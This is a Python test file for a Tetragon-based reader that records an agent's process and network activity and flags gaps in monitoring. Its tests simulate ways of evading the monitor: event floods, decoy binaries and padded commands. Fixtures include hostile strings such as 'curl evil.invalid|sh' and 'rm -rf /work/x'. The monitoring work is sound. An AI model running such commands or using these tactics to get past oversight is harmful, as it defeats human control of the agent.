def test_probes_of_an_earlier_run_are_not_recorded(
    tetragon: Tetragon, box: Box, make_reader: Callable[..., TetragonReader]
) -> None:
    """A probe the killed service launched is not expected by the new one: it is not one of
    the agent's commands either. Only a probe from before this reader started is stale."""
    old, new = procs.new_nonce("hb"), procs.new_nonce("hb")
    late = json.loads(exec_line(new))
    late["time"] = (WALL + timedelta(seconds=5)).strftime("%Y-%m-%dT%H:%M:%S.%f000Z")
    tetragon.write(exec_line(old), json.dumps(late))
    reader = make_reader(stale_probes_before=WALL)
    reader.poll()
    assert box.argvs() == [new]  # unexpected and newer than the reader: recorded, as before
    assert reader.stats()["stale_probes"] == 1


# --- T07 review: floods must not erase who else ran ----------------------------------------


def test_past_the_bucket_the_first_of_each_binary_are_still_recorded(
    tetragon: Tetragon, box: Box, clock: Clock, make_reader: Callable[..., TetragonReader]
) -> None:
    reader = make_reader(exec_rate=0.001, exec_burst=2, novel_per_binary=3)
    flood = [exec_line("t", binary="/bin/true") for _ in range(200)]
    tetragon.write(*flood[:100], exec_line("the real one", binary="/usr/bin/curl"), *flood[100:])
    reader.poll()
    recorded = box.of("exec", "exec")
    # 2 from the bucket, then 3 more of /bin/true and the curl, marked novel.
    assert [e.target for e in recorded].count("/bin/true") == 5
    (curl,) = [e for e in recorded if e.target == "/usr/bin/curl"]
    assert curl.details["argv"] == "the real one" and curl.details["novel"] is True
    assert reader.stats()["novel"] == 4
    clock.advance(10)
    reader.poll()
    (summary,) = box.of("exec", "summary")
    assert summary.details["folded"] == 195
    # A new window: every binary is new again.
    tetragon.write(*(exec_line("t", binary="/bin/true") for _ in range(10)))
    reader.poll()
    assert [e.target for e in box.of("exec", "exec")].count("/bin/true") == 8


def test_the_novelty_bucket_is_bounded(
    tetragon: Tetragon, box: Box, make_reader: Callable[..., TetragonReader]
) -> None:
    reader = make_reader(
        exec_rate=0.001,
        exec_burst=1,
        novel_per_binary=1,
        novel_rate=0.001,
        novel_burst=10,
        first_rate=0.001,
        first_burst=10,
    )
    tetragon.write(*(exec_line("x", binary=f"/w/bin{i}") for i in range(100)))
    reader.poll()
    assert len(box.of("exec", "exec")) == 1 + 10


def test_the_novelty_budget_is_bounded(
    tetragon: Tetragon, box: Box, clock: Clock, make_reader: Callable[..., TetragonReader]
) -> None:
    reader = make_reader(exec_rate=0.001, exec_burst=1, novel_per_binary=1, novel_daily=3)
    for i in range(10):
        tetragon.write(exec_line("x", binary=f"/w/bin{i}"))
        reader.poll()
        clock.advance(10)
    assert len(box.of("exec", "exec")) == 1 + 3


def test_an_exhausted_budget_still_records_the_first_of_each_binary(
    tetragon: Tetragon, box: Box, make_reader: Callable[..., TetragonReader]
) -> None:
    reader = make_reader(exec_daily=2, novel_per_binary=1)
    tetragon.write(*(exec_line("n") for _ in range(5)), exec_line("rm", binary="/bin/rm"))
    reader.poll()
    assert [e.target for e in box.of("exec", "exec")] == ["/bin/true"] * 3 + ["/bin/rm"]
    (warning,) = box.gaps("budget")
    assert warning["class"] == "exec"


def test_the_summary_lists_every_binary_the_rarest_first(
    tetragon: Tetragon, box: Box, clock: Clock, make_reader: Callable[..., TetragonReader]
) -> None:
    reader = make_reader(exec_rate=0.001, exec_burst=1, novel_per_binary=0)
    lines = [exec_line("x", binary="/bin/true") for _ in range(300)]
    lines += [exec_line("y", binary=f"/w/tool{i}") for i in range(60)]
    lines += [exec_line("z", binary="/bin/sh"), exec_line("z", binary="/bin/sh")]
    tetragon.write(*lines)
    reader.poll()
    clock.advance(10)
    reader.poll()
    (summary,) = box.of("exec", "summary")
    listed = summary.details["binaries"]
    assert len(listed) == 50
    assert summary.details["distinct_binaries"] == 62
    assert all(item["count"] == 1 for item in listed)  # the flood of /bin/true is last
    assert summary.details["top_binaries"][0] == {"binary": "/bin/true", "count": 299}


def test_throttles_are_one_gap_per_summary_interval_with_a_count(
    tetragon: Tetragon, box: Box, clock: Clock, make_reader: Callable[..., TetragonReader]
) -> None:
    reader = make_reader()
    for _ in range(20):
        tetragon.write(raw("throttle_start"), raw("throttle_stop"))
        reader.poll()
        clock.advance(0.5)
    assert len(box.gaps("throttle")) == 1  # the first one, at once
    reader.poll()  # 10 s later: the held ones, in one gap
    reader.poll()
    gaps = box.gaps("throttle")
    held = sum(g.get("held", {}).get("starts", 0) + g.get("held", {}).get("stops", 0) for g in gaps)
    assert len(gaps) == 2
    assert gaps[1]["state"] == "repeated" and gaps[1]["held"] == {"starts": 19, "stops": 20}
    assert held + 1 == 40  # every start and stop is accounted for


def test_an_oversize_line_keeps_a_long_binary_and_says_when_it_is_lost(
    tetragon: Tetragon, box: Box, make_reader: Callable[..., TetragonReader]
) -> None:
    long_cwd = "/w/" + "\x01" * 4000  # 24 KiB once escaped: past the old 8 KiB
    data = json.loads(exec_line("a" + "\x02" * 500_000, binary="/usr/bin/sh"))
    process = data["process_exec"]["process"]
    process["cwd"] = long_cwd
    # Tetragon writes cwd before binary (field order of the fixture is kept by json.dumps).
    tetragon.write(json.dumps(data))
    reader = make_reader()
    reader.poll()
    (first,) = box.of("exec", "exec")
    assert first.target == "/usr/bin/sh" and "binary_lost" not in first.details

    data = json.loads(exec_line("a" + "\x02" * 500_000, binary="/x"))
    data["process_exec"]["process"]["binary"] = "/" + "\x03" * 20000  # 120 KiB escaped
    tetragon.write(json.dumps(data))
    reader.poll()
    second = box.of("exec", "exec")[1]
    assert second.details["oversize"] is True and second.details["binary_lost"] is True


# --- T07 re-review: throttles and lost novelty make the reader blind ----------------------


def test_a_throttle_is_risk_2_and_a_blind_spot(
    tetragon: Tetragon, box: Box, make_reader: Callable[..., TetragonReader]
) -> None:
    reader = make_reader()
    tetragon.write(raw("throttle_start"))
    reader.poll()
    assert [e.risk for e in box.of("system", "sensor_gap")] == [2]
    assert reader.take_blind_spots() == {"throttle": 1}
    assert reader.take_blind_spots() == {}


def test_decoys_with_names_of_their_own_cannot_hide_the_real_command(
    tetragon: Tetragon, box: Box, clock: Clock, make_reader: Callable[..., TetragonReader]
) -> None:
    """Re-review A3: the buckets drained by a flood, the novelty burst by decoys, then more
    decoys named to sort first, then the real command."""
    reader = make_reader(
        exec_rate=0.001,
        exec_burst=1,
        novel_rate=0.001,
        novel_burst=3,
        first_rate=0.001,
        first_burst=3,
    )
    lines = [exec_line("x", binary="/bin/true") for _ in range(5)]
    lines += [exec_line("y", binary=f"/workspace/d/{i:04d}") for i in range(80)]
    lines.append(exec_line("evil.invalid", binary="/usr/bin/curl"))
    tetragon.write(*lines)
    reader.poll()
    assert "/usr/bin/curl" not in [e.target for e in box.of("exec", "exec")]
    clock.advance(10)
    reader.poll()
    (summary,) = box.of("exec", "summary")
    # Among the equally rare, the image's programs come first: /bin/true's one folded, curl.
    assert {"binary": "/usr/bin/curl", "count": 1} in summary.details["binaries"][:2]
    (lost,) = box.gaps("novelty_lost")
    # /bin/true's repeats took the repeat bucket; 3 decoys took the first-event bucket: the
    # other 77 decoys and curl have no event of their own.
    assert lost["class"] == "exec" and lost["binaries"] == 78
    risks = sorted(e.risk for e in box.of("system", "sensor_gap"))
    assert risks == [1, 2]  # novelty_lost (risk 2) and /bin/true's repeats (argv_folded, risk 1)
    assert reader.take_blind_spots() == {"novelty_lost": 1}


def test_a_spent_novelty_budget_is_a_spent_budget(
    tetragon: Tetragon, box: Box, make_reader: Callable[..., TetragonReader]
) -> None:
    reader = make_reader(exec_rate=0.001, exec_burst=1, novel_daily=2)
    tetragon.write(*(exec_line("x", binary=f"/w/b{i}") for i in range(5)))
    reader.poll()
    assert reader.exhausted_budgets() == ["exec_novel"]


# --- T07 third pass: a command line of its own, and the first of each binary --------------


def test_a_new_command_line_of_a_seen_binary_gets_its_own_novelty(
    tetragon: Tetragon, box: Box, make_reader: Callable[..., TetragonReader]
) -> None:
    """Third pass M-b: three `sh -c true` must not use up the novelty of `sh -c <evil>`."""
    reader = make_reader(exec_rate=0.001, exec_burst=1)
    lines = [exec_line("x") for _ in range(10)]
    lines += [exec_line("-c true", binary="/bin/sh") for _ in range(3)]
    lines.append(exec_line('-c "rm -rf /work/x"', binary="/bin/sh"))
    tetragon.write(*lines)
    reader.poll()
    argvs = [e.details["argv"] for e in box.of("exec", "exec") if e.target == "/bin/sh"]
    assert '-c "rm -rf /work/x"' in argvs


def test_a_builds_repeated_command_is_a_risk_1_gap_not_a_blind_spot(
    tetragon: Tetragon, box: Box, clock: Clock, make_reader: Callable[..., TetragonReader]
) -> None:
    """Quota met for one command (a build running it many times): risk 1, not blind."""
    reader = make_reader(
        exec_rate=0.001, exec_burst=1, novel_per_binary=3, novel_burst=100, first_burst=100
    )
    tetragon.write(*(exec_line("-c make", binary="/bin/sh") for _ in range(10)))
    reader.poll()
    clock.advance(10)
    reader.poll()
    (folded,) = box.gaps("argv_folded")
    assert folded["class"] == "exec" and folded["events"] == 10 - 1 - 3
    assert box.gaps("novelty_lost") == []
    assert [e.risk for e in box.of("system", "sensor_gap")] == [1]
    assert reader.take_blind_spots() == {}  # a build must not stop a required agent


def test_a_command_of_a_recorded_binary_a_drained_bucket_turned_away_is_risk_2_not_blind(
    tetragon: Tetragon, box: Box, clock: Clock, make_reader: Callable[..., TetragonReader]
) -> None:
    """M1, then T07-5: seed rm, drain the buckets with argv variants of /bin/true, then run
    rm -rf: folded because the bucket was empty. Risk 2, but /bin/rm has an event of its own in
    the window, so it is not a blind spot (a build must not stop a required agent): it is
    alerted (take_unseen) instead."""
    reader = make_reader(
        exec_rate=0.001,
        exec_burst=1,
        novel_per_binary=3,
        novel_rate=0.001,
        novel_burst=3,
        first_rate=0.001,
        first_burst=2,
    )
    lines = [exec_line("/nada", binary="/bin/rm")]  # seed: /bin/rm seen
    lines += [exec_line(f"-c 'v {i}'", binary="/bin/true") for i in range(20)]  # drains buckets
    lines.append(exec_line("-rf /work/x", binary="/bin/rm"))  # a new command of a seen binary
    tetragon.write(*lines)
    reader.poll()
    assert "-rf /work/x" not in [e.details["argv"] for e in box.of("exec", "exec")]
    clock.advance(10)
    reader.poll()
    (lost,) = box.gaps("novelty_lost")
    assert lost["class"] == "exec" and lost["events"] >= 1 and lost["blind"] is False
    assert 2 in [e.risk for e in box.of("system", "sensor_gap")]
    assert reader.take_blind_spots() == {}
    assert "/bin/rm" in reader.take_unseen() and reader.take_unseen() == {}


def test_the_first_event_of_each_binary_has_its_own_bucket(
    tetragon: Tetragon, box: Box, make_reader: Callable[..., TetragonReader]
) -> None:
    """Third pass B-b: repeats (decoys of one name, or argv variations) cannot use up the
    room for programs not seen yet in the window."""
    reader = make_reader(exec_rate=0.001, exec_burst=1, novel_rate=0.001, novel_burst=5)
    lines = [exec_line(f"-c 'step {i}'", binary="/bin/sh") for i in range(50)]
    lines += [exec_line("x", binary=f"/usr/bin/tool{i}") for i in range(40)]
    tetragon.write(*lines)
    reader.poll()
    targets = {e.target for e in box.of("exec", "exec")}
    assert {f"/usr/bin/tool{i}" for i in range(40)} <= targets


# --- T07-5: an exact repeat, a build under required, a lost rotated file, the stall ---------


def _padding(size: int) -> str:
    """Text that does not fold (no run of one unit 16 times): the head the reader hashes."""
    return "".join(f"{i:03d}," for i in range(size // 4 + 1))[:size]


def test_a_shared_head_with_a_different_tail_is_not_a_repeat(
    tetragon: Tetragon, box: Box, clock: Clock, make_reader: Callable[..., TetragonReader]
) -> None:
    """T07-5: the novelty key was the first 256 characters of the argv, so a padded `sh -c`
    followed by the same padding and `curl evil|sh` counted as a repeat (risk 1)."""
    reader = make_reader(
        exec_rate=0.001, exec_burst=1, novel_rate=0.001, novel_burst=1,
        first_rate=0.001, first_burst=1,
    )  # fmt: skip
    pad = _padding(250)
    tetragon.write(
        exec_line("x"),  # the bucket
        exec_line("x"),  # the novelty bucket (a repeat of a recorded binary)
        exec_line(f'-c "{pad}; true"', binary="/bin/sh"),  # the first-event bucket
        exec_line(f'-c "{pad}; curl evil.invalid|sh"', binary="/bin/sh"),  # folded
    )
    reader.poll()
    clock.advance(10)
    reader.poll()
    assert box.gaps("argv_folded") == []
    (lost,) = box.gaps("novelty_lost")
    assert lost["commands"] == 1 and lost["events"] == 1
    assert [e.risk for e in box.of("system", "sensor_gap")] == [2]
    # The digest that tells them apart is never stored.
    stored = json.dumps([e.details for e in box.events])
    assert "fingerprint" not in stored
    assert not any(len(word) == 64 for word in stored.replace('"', " ").split())


def test_an_exact_repeat_is_still_a_repeat(
    tetragon: Tetragon, box: Box, clock: Clock, make_reader: Callable[..., TetragonReader]
) -> None:
    reader = make_reader(exec_rate=0.001, exec_burst=1, novel_per_binary=1)
    pad = _padding(3000)  # longer than what details["argv"] keeps
    tetragon.write(*(exec_line(f"-c '{pad}; make'", binary="/bin/sh") for _ in range(6)))
    reader.poll()
    clock.advance(10)
    reader.poll()
    (folded,) = box.gaps("argv_folded")
    assert folded["events"] == 4 and box.gaps("novelty_lost") == []


def test_a_build_of_one_compiler_is_not_a_blind_spot(
    tetragon: Tetragon, box: Box, clock: Clock, make_reader: Callable[..., TetragonReader]
) -> None:
    """T07-5: under required, `make -j` (many distinct `cc -c` of one binary) drained the
    novelty bucket and novelty_lost stopped the agent. The compiler has events of its own in
    the window: risk 2 and an alert, not a blind spot."""
    reader = make_reader(
        exec_rate=0.001, exec_burst=1, novel_rate=0.001, novel_burst=2,
        first_rate=0.001, first_burst=2,
    )  # fmt: skip
    tetragon.write(*(exec_line(f"-c f{i}.c -o f{i}.o", binary="/usr/bin/cc") for i in range(50)))
    reader.poll()
    clock.advance(10)
    reader.poll()
    (lost,) = box.gaps("novelty_lost")
    assert lost["blind"] is False and lost["binaries"] == 1 and lost["events"] >= 40
    assert reader.take_blind_spots() == {}
    assert reader.take_unseen() == {"/usr/bin/cc": 1}
    assert lost["names"] == ["/usr/bin/cc"]


def test_a_binary_with_no_event_of_its_own_is_still_blind(
    tetragon: Tetragon, box: Box, clock: Clock, make_reader: Callable[..., TetragonReader]
) -> None:
    reader = make_reader(
        exec_rate=0.001, exec_burst=1, novel_rate=0.001, novel_burst=1,
        first_rate=0.001, first_burst=1,
    )  # fmt: skip
    tetragon.write(
        exec_line("x"),
        exec_line("a", binary="/usr/bin/cc"),  # the first-event bucket
        exec_line("b", binary="/usr/bin/cc"),  # the novelty bucket
        exec_line("c", binary="/usr/bin/cc"),  # folded: cc was recorded
        exec_line("evil.invalid", binary="/usr/bin/curl"),  # folded: no event of curl
    )
    reader.poll()
    clock.advance(10)
    reader.poll()
    blind = [g for g in box.gaps("novelty_lost") if g["blind"]]
    seen = [g for g in box.gaps("novelty_lost") if not g["blind"]]
    assert len(blind) == 1 and blind[0]["binaries"] == 1
    assert len(seen) == 1 and seen[0]["binaries"] == 1
    assert reader.take_blind_spots() == {"novelty_lost": 1}
    assert reader.take_unseen() == {"/usr/bin/cc": 1}
    assert blind[0]["names"] == ["/usr/bin/curl"]


def test_a_rotated_file_lost_is_a_blind_spot(
    tetragon: Tetragon, box: Box, make_reader: Callable[..., TetragonReader]
) -> None:
    """T07-5: losing a rotated file was risk 2 but no alert and no stop under required."""
    tetragon.write(exec_line("a"))
    reader = make_reader(max_bytes_per_poll=1)
    tetragon.write(exec_line("b"))
    tetragon.rotate()
    tetragon.write(exec_line("c"))
    second = tetragon.rotate()
    tetragon.write(exec_line("d"))
    reader.poll()
    second.unlink()
    for _ in range(5000):
        reader.poll()
    assert len(box.gaps("rotated")) == 1
    assert reader.take_blind_spots() == {"rotated": 1}


def test_a_cursor_whose_file_is_gone_is_a_blind_spot(
    tetragon: Tetragon, box: Box, make_reader: Callable[..., TetragonReader]
) -> None:
    tetragon.write(exec_line("a"))
    first = make_reader()
    first.poll()
    first.save_cursor()
    first.close()
    old = tetragon.rotate()
    tetragon.rotate()
    old.unlink()
    second = make_reader()
    second.poll()
    assert second.take_blind_spots() == {"rotated": 1}


class BlockingBox(Box):
    """A black box whose append waits on an Event: a poll stuck for real."""

    def __init__(self) -> None:
        super().__init__()
        self.entered = threading.Event()
        self.release = threading.Event()

    def append(self, *args: Any, **kwargs: Any) -> object:
        self.entered.set()
        assert self.release.wait(10)
        return super().append(*args, **kwargs)


def test_a_poll_stuck_for_real_is_blocked_and_the_lock_can_be_tried(
    tmp_path: Path, tetragon: Tetragon
) -> None:
    """T07-5: blocked() sees a real stuck poll; held(timeout) gives up instead of waiting."""
    box = BlockingBox()
    config = ReaderConfig(events_dir=tetragon.events, cursor_file=tmp_path / "cursor.json")
    reader = TetragonReader(config, box, agent_id=TARGET_ID)
    tetragon.write(exec_line("stuck"))
    stuck = threading.Thread(target=reader.poll, daemon=True)
    stuck.start()
    try:
        assert box.entered.wait(5)
        assert reader.blocked(0.0)
        start = time.monotonic()
        with reader.held(0.2) as got:
            assert got is False
        assert time.monotonic() - start < 2
        assert reader.wait_seen("backtide-hb-" + "0" * 32, 0.2) is False  # never hangs
    finally:
        box.release.set()
        stuck.join(5)
    assert not reader.blocked(0.0)
    with reader.held(0.2) as got:
        assert got is True


def test_a_second_poller_waiting_for_the_lock_does_not_clear_the_first_ones_mark(
    tmp_path: Path, tetragon: Tetragon
) -> None:
    """T07-5: polling_since is set inside the lock and cleared only by the poll that set it."""
    box = BlockingBox()
    config = ReaderConfig(events_dir=tetragon.events, cursor_file=tmp_path / "cursor.json")
    reader = TetragonReader(config, box, agent_id=TARGET_ID)
    tetragon.write(exec_line("stuck"))
    first = threading.Thread(target=reader.poll, daemon=True)
    first.start()
    assert box.entered.wait(5)
    since = reader.polling_since
    second = threading.Thread(target=reader.poll, daemon=True)
    second.start()
    time.sleep(0.2)  # the second waits for the lock
    assert reader.polling_since == since  # not overwritten by the one waiting
    box.release.set()
    first.join(5)
    second.join(5)
    assert reader.polling_since is None


def test_a_poll_returns_after_its_time_budget(
    tetragon: Tetragon, box: Box, clock: Clock, make_reader: Callable[..., TetragonReader]
) -> None:
    """A poll with much to read gives the lock back after poll_time_budget."""
    reader = make_reader(read_size=4096, poll_time_budget=2.0)
    tetragon.write(*(exec_line(f"n{i}") for i in range(50)))
    real_read = reader._read

    def slow_read(budget: int) -> int:
        clock.advance(0.5)  # every read takes half a second
        return real_read(budget)

    reader._read = slow_read  # type: ignore[method-assign]
    first = reader.poll()
    assert 0 < first < 50  # stopped at the budget, more left to read
    while reader.poll():
        pass
    assert len(box.argvs()) == 50


def test_a_connection_to_a_new_target_is_not_a_repeat(
    tetragon: Tetragon, box: Box, clock: Clock, make_reader: Callable[..., TetragonReader]
) -> None:
    """T07-5 review: every connection of a binary was one 'command' for novelty, so a direct
    connection to a new address after a flood to the proxy counted as a repeat (risk 1)."""
    reader = make_reader(
        net_rate=0.001, net_burst=1, novel_rate=0.001, novel_burst=1,
        first_rate=0.001, first_burst=1,
    )  # fmt: skip
    usual = json.loads(raw("connect_tcp4"))
    other = copy.deepcopy(usual)
    for arg in other["process_kprobe"]["args"]:
        if "sockaddr_arg" in arg:
            arg["sockaddr_arg"]["addr"] = "198.51.100.7"
    tetragon.write(*([json.dumps(usual)] * 8), json.dumps(other))
    reader.poll()
    clock.advance(10)
    reader.poll()
    (lost,) = box.gaps("novelty_lost")
    assert lost["class"] == "net" and lost["commands"] == 1 and lost["events"] == 1


def test_a_streak_of_windows_with_unseen_command_lines_is_measured(
    tetragon: Tetragon, box: Box, clock: Clock, make_reader: Callable[..., TetragonReader]
) -> None:
    """The founder's decision B (2026-10-19): how long novelty_lost {blind: false} has gone on
    without a window free of it. A window without one resets it."""
    reader = make_reader(
        exec_rate=0.001, exec_burst=1, novel_rate=0.001, novel_burst=1,
        first_rate=0.001, first_burst=100,
    )  # fmt: skip
    # Each window: cc's first event recorded (its own bucket), the rest of its distinct
    # command lines folded unseen.
    assert reader.unseen_streak() == 0
    for window in range(4):
        tetragon.write(*(exec_line(f"-c f{window}-{i}.c", binary="/usr/bin/cc") for i in range(6)))
        reader.poll()
        clock.advance(10)
        reader.poll()
    assert reader.unseen_streak() >= 30
    clock.advance(10)
    reader.poll()  # a whole window with nothing folded unseen
    assert reader.unseen_streak() == 0
